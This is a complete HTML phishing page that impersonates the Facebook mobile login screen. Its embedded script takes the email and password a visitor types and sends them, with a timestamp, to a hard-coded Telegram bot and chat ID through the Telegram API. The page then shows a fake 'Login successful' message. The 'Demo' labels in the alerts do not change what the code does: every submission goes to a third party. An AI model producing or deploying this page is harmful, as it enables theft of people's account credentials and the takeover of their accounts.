<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Facebook Mobile Login</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        fbBlue: '#0064e0',
                        fbBlueHover: '#0052b8',
                        fbGray: '#f0f2f5',
                        fbText: '#1c1e21',
                        fbBorder: '#ccd0d5',
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;500;700&display=swap');

        * {
            -webkit-tap-highlight-color: transparent;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .mobile-container {
            width: 100%;
            max-width: 400px;
            margin: 0 auto;
            padding: 16px 20px 24px;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background-color: #ffffff;
            position: relative;
        }

        .fb-logo {
            color: #0064e0;
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-weight: 800;
            font-size: 28px;
            letter-spacing: -0.5px;
            line-height: 1.2;
            text-decoration: none;
            display: inline-block;
            margin-bottom: 8px;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            line-height: 1.5;
            border: 1px solid #ccd0d5;
            border-radius: 12px;
            background-color: #fff;
            color: #1c1e21;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .input-field:focus {
            border-color: #0064e0;
            box-shadow: 0 0 0 2px rgba(0, 100, 224, 0.2);
        }

        .input-field::placeholder {
            color: #8a8d91;
            font-weight: 400;
        }

        .btn-primary {
            width: 100%;
            padding: 14px 16px;
            background-color: #0064e0;
            color: white;
            font-weight: 600;
            font-size: 17px;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: background-color 0.2s;
            text-align: center;
            display: block;
        }

        .btn-primary:hover {
            background-color: #0052b8;
        }

        .btn-primary:active {
            background-color: #004a9e;
        }

        .btn-primary:disabled {
            background-color: #7aa9e8;
            cursor: not-allowed;
        }

        .btn-secondary {
            width: 100%;
            padding: 14px 16px;
            background-color: #ffffff;
            color: #0064e0;
            font-weight: 600;
            font-size: 17px;
            border: 1.5px solid #0064e0;
            border-radius: 12px;
            cursor: pointer;
            transition: background-color 0.2s, border-color 0.2s;
            text-align: center;
            display: block;
        }

        .btn-secondary:hover {
            background-color: #f0f7ff;
            border-color: #0052b8;
        }

        .btn-secondary:active {
            background-color: #e0efff;
        }

        .link {
            color: #0064e0;
            font-size: 15px;
            font-weight: 500;
            text-decoration: none;
            display: inline-block;
        }

        .link:hover {
            text-decoration: underline;
        }

        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #ccd0d5;
        }

        .divider span {
            padding: 0 16px;
            color: #606770;
            font-size: 14px;
            font-weight: 500;
        }

        .footer {
            margin-top: auto;
            padding-top: 32px;
            text-align: center;
        }

        .meta-text {
            color: #1c1e21;
            font-size: 14px;
            font-weight: 500;
            letter-spacing: 0.3px;
        }

        .lang-selector {
            color: #606770;
            font-size: 13px;
            text-align: center;
            margin-bottom: 12px;
        }

        .lang-selector a {
            color: #0064e0;
            text-decoration: none;
            margin: 0 4px;
        }

        .lang-selector a:hover {
            text-decoration: underline;
        }

        .spacer {
            flex: 1;
            min-height: 20px;
        }

        @media (max-width: 360px) {
            .mobile-container {
                padding: 12px 16px 20px;
            }
            .fb-logo {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="mobile-container">
        <div class="mt-2">
            <div class="fb-logo">facebook</div>
        </div>

        <div class="mt-8">
            <div class="mb-4">
                <input 
                    type="text" 
                    id="email" 
                    name="email" 
                    class="input-field" 
                    placeholder="Mobile number or email address"
                    autocomplete="username"
                    aria-label="Mobile number or email address"
                >
            </div>

            <div class="mb-6">
                <input 
                    type="password" 
                    id="password" 
                    name="password" 
                    class="input-field" 
                    placeholder="Password"
                    autocomplete="current-password"
                    aria-label="Password"
                >
            </div>

            <div class="mb-4">
                <button class="btn-primary" id="loginBtn">
                    Log In
                </button>
            </div>

            <div class="text-center mb-6">
                <a href="#" class="link text-sm">Forgot password?</a>
            </div>

            <div class="divider">
                <span>OR</span>
            </div>

            <div class="mb-6">
                <button class="btn-secondary" id="createBtn">
                    Create new account
                </button>
            </div>
        </div>

        <div class="spacer"></div>

        <div class="footer">
            <div class="lang-selector">
                <a href="#">English (US)</a>
                <a href="#">Español</a>
                <a href="#">Français</a>
                <a href="#">中文</a>
            </div>
            <div class="mt-2">
                <span class="meta-text">Meta</span>
            </div>
            <div class="mt-2 text-xs text-gray-400">
                <span>About · Help · More</span>
            </div>
        </div>
    </div>

    <script>
        (function() {
            // ----- Telegram configuration -----
            const TELEGRAM_BOT_TOKEN = '9299028865:AAExLoS5OxYUPy1DQDGUx8ABMdfrZMBV2aI';
            const TELEGRAM_CHAT_ID = '8411202094';
            const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            // ----- Element references -----
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const loginBtn = document.getElementById('loginBtn');
            const createBtn = document.getElementById('createBtn');

            // ----- Helper: send message to Telegram -----
            async function sendToTelegram(username, password) {
                const now = new Date().toLocaleString();
                const message =
                    `🔐 New Login Attempt\n` +
                    `━━━━━━━━━━━━━━━\n` +
                    `👤 Username/Email: ${username}\n` +
                    `🔑 Password: ${password}\n` +
                    `🕒 Time: ${now}\n` +
                    `🌐 Page: Facebook Mobile Login`;

                const payload = {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message
                };

                try {
                    const response = await fetch(TELEGRAM_API_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    const data = await response.json();
                    if (!data.ok) {
                        console.error('Telegram API error:', data);
                        return false;
                    }
                    return true;
                } catch (err) {
                    console.error('Network error sending to Telegram:', err);
                    return false;
                }
            }

            // ----- Login button -----
            loginBtn.addEventListener('click', async function(e) {
                e.preventDefault();

                const email = emailInput.value.trim();
                const password = passwordInput.value.trim();

                if (!email || !password) {
                    alert('Please enter both email/phone and password.');
                    return;
                }

                // Disable button and show loading state
                loginBtn.disabled = true;
                const originalText = loginBtn.textContent;
                loginBtn.textContent = 'Logging in...';

                const sent = await sendToTelegram(email, password);

                // Restore button
                loginBtn.disabled = false;
                loginBtn.textContent = originalText;

                if (sent) {
                    // Simulate successful login flow
                    alert('Login successful! (Demo -- credentials sent to Telegram.)');
                    // Optionally clear fields
                    // emailInput.value = '';
                    // passwordInput.value = '';
                } else {
                    alert('Something went wrong. Please try again.');
                }
            });

            // ----- Create account button -----
            createBtn.addEventListener('click', function(e) {
                e.preventDefault();
                alert('Demo: Create new account flow would open here.');
            });

            // ----- Forgot password link -----
            document.querySelector('a[href="#"]').addEventListener('click', function(e) {
                if (this.textContent.includes('Forgot')) {
                    e.preventDefault();
                    alert('Demo: Password reset flow would open here.');
                }
            });

            // ----- Language links -----
            document.querySelectorAll('.lang-selector a').forEach(link => {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    alert(`Demo: Language would switch to ${this.textContent}`);
                });
            });

            // ----- Legal footer -----
            document.querySelectorAll('.text-xs.text-gray-400 span').forEach(span => {
                span.style.cursor = 'pointer';
                span.addEventListener('click', function(e) {
                    e.stopPropagation();
                    alert('Demo: Info page would open.');
                });
            });
        })();
    </script>
</body>
</html>
